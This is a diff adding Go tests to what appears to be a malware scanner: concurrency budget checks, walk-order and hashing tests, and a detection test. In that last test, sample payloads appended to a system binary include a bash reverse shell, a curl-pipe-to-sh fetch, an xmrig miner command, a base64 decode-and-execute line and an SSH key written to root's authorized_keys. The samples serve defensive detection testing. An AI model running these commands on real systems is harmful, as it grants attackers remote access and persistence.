@@ -1,12 +1,17 @@
 package scanner
 
 import (
+	"bytes"
 	"os"
 	"path/filepath"
 	"reflect"
 	"strings"
+	"sync"
 	"sync/atomic"
 	"testing"
+	"time"
+
+	"github.com/s-b-repo/cau/scanner/fusion"
 )
 
 func panicFixture(t *testing.T) string {
@@ -139,5 +144,125 @@ func BenchmarkScanFile(b *testing.B) {
 				e.ScanFile(c.path)
 			}
 		})
+	}
+}
+
+// A burst of large files waits, and nothing is lost by it.
+func TestBudgetBoundsWhatIsHeldAndNeverDeadlocks(t *testing.T) {
+	b := newBudget(100)
+	var held, peak atomic.Int64
+	var wg sync.WaitGroup
+	for i := range 64 {
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			n := int64(10 + i%60)
+			release := b.acquire(n)
+			h := held.Add(n)
+			for {
+				p := peak.Load()
+				if h <= p || peak.CompareAndSwap(p, h) {
+					break
+				}
+			}
+			time.Sleep(200 * time.Microsecond)
+			held.Add(-n)
+			release()
+		}()
+	}
+	wg.Wait()
+	if peak.Load() > 100 {
+		t.Fatalf("held %d of a 100 byte budget", peak.Load())
+	}
+}
+
+// Asking for more than the whole budget must run, alone, rather than wait for ever.
+func TestRequestOverTheBudgetStillRuns(t *testing.T) {
+	b := newBudget(10)
+	done := make(chan struct{})
+	go func() {
+		b.acquire(1000)()
+		close(done)
+	}()
+	select {
+	case <-done:
+	case <-time.After(5 * time.Second):
+		t.Fatal("a file larger than the budget would never be scanned")
+	}
+}
+
+// The streaming walk must keep the old contract: walk order, every file once.
+func TestScanDirectoryKeepsWalkOrderAndCoversEverything(t *testing.T) {
+	root := t.TempDir()
+	want := []string{}
+	for _, name := range []string{"a/1", "a/2", "b/4", "b/c/3", "z"} {
+		p := filepath.Join(root, name)
+		_ = os.MkdirAll(filepath.Dir(p), 0o755)
+		_ = os.WriteFile(p, []byte(name), 0o644)
+		want = append(want, p)
+	}
+	e := &Engine{Jobs: 4}
+	last := 0
+	res, _ := e.ScanDirectory(root, func(done, total int, _ string) {
+		if total < done {
+			t.Errorf("total %d is behind done %d", total, done)
+		}
+		last = done
+	})
+	var got []string
+	for _, r := range res {
+		got = append(got, r.FilePath)
+	}
+	if !reflect.DeepEqual(got, want) {
+		t.Fatalf("got %v", got)
+	}
+	if last != len(want) {
+		t.Fatalf("progress ended at %d", last)
+	}
+}
+
+// Hashing in chunks on three goroutines must give the digests hashing whole does.
+func TestStreamingHashMatchesInMemoryHash(t *testing.T) {
+	data := bytes.Repeat([]byte("0123456789abcdef"), 1<<18) // 4 MiB, several chunks
+	whole := hashBytes(data)
+	streamed, err := hashReader(bytes.NewReader(data))
+	if err != nil {
+		t.Fatal(err)
+	}
+	if whole != streamed {
+		t.Fatalf("%+v != %+v", whole, streamed)
+	}
+	if small := hashBytes([]byte("x")); small == (digests{}) {
+		t.Fatal("the small-file path must hash too")
+	}
+}
+
+// A binary carrying its payload as a string. Nothing else in the engine reads it:
+// tradecraft treats the file as binary. This path looks like wasted work, and the
+// scan of ordinary binaries that would pay for removing it is exactly what the
+// prefilter made cheap, so it stays.
+func TestELFCarryingScriptStaysFlagged(t *testing.T) {
+	real, err := os.ReadFile("/usr/bin/true")
+	if err != nil {
+		t.Skip(err)
+	}
+	for name, payload := range map[string]string{
+		"reverse-shell": "\nexport PATH=/tmp\nbash -i >& /dev/tcp/198.51.100.1/443 0>&1\n",
+		"curl-pipe":     "\nexport X=1\ncurl -s http://198.51.100.1/x | sh\n",
+		"miner":         "\nalias x=y\nxmrig --donate-level 1 -o stratum+tcp://pool.example:3333\n",
+		"decode-exec":   "\nsource /tmp/x\necho aGk= | base64 -d | sh\n",
+		"ssh-key":       "\nPATH=/x\necho 'ssh-rsa AAAA' >> /root/.ssh/authorized_keys\n",
+	} {
+		path := filepath.Join(t.TempDir(), name)
+		if err := os.WriteFile(path, append(append([]byte{}, real...), payload...), 0o755); err != nil {
+			t.Fatal(err)
+		}
+		r, _ := allDetectors().ScanFile(path)
+		if r.LinuxPkg == nil || len(r.LinuxPkg.Findings) == 0 {
+			t.Errorf("%s: the payload was not found", name)
+		}
+		if r.Fusion == nil || r.Fusion.Tier != fusion.TierSuspicious && r.Fusion.Tier != fusion.TierMalicious {
+			t.Errorf("%s: not flagged: %+v", name, r.Fusion)
+		}
 	}
 }
